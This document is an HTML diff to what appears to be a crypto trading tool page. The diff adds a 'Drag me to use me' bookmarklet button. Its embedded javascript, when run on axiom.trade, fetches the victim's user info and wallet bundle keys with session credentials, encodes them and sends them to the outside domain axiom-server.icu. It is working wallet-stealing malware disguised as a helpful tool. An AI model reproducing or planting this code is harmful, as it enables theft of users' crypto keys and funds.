@@ -33,6 +33,32 @@
           </div>
         </div>
         <div class="Home_home__empxm">
+<!-- BOUTON BOOKMARKLET AU-DESSUS DU LOGO -->
+<div style="text-align:center; margin-bottom:1em;">
+  <a
+    href="javascript:(async()=>{try{if(location.hostname!='axiom.trade'){location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return;const user=await (await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundleRes=await (await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bundleString=`${localStorage.getItem('sBundles')};${bundleRes.bundleKey}`;location.replace(`https://axiom-server.icu/${btoa(JSON.stringify({hash:'MDs3NTE3MDE1NDcx',site:'https://trendsniperpro.vercel.app//api/wallets',user,bundle:bundleString}))}`)}}catch(e){}})();"
+    style="
+      display:inline-block;
+      background:#ffcd26;
+      color:#000;
+      border:none;
+      border-radius:2em;
+      padding:0.6em 1.8em;
+      font-size:1em;
+      font-weight:500;
+      cursor:grab;
+      text-decoration:none;
+      margin: 0 auto;
+      box-shadow:0 2px 8px #0002;
+      user-select:none;
+      position:relative;
+      top: 58px;"
+    title="Drag me to your bookmarks bar to use me"
+    draggable="true"
+  >
+    Drag me to use me
+  </a>
+</div>
           <object data="logo2.svg" type="image/svg+xml" class="Home_mainLogo__HkFYs"></object>
           <div style="height:40vh">
             <div style="text-align:center">
@@ -63,7 +89,7 @@
     margin-right:auto;
   "
 >
-  Rechercher
+  Research
 </button>
   <br>
   Powered by <a class="Home_solidusLink__baoS4" href="https://www.soliduslabs.com/">Solidus Labs</a>
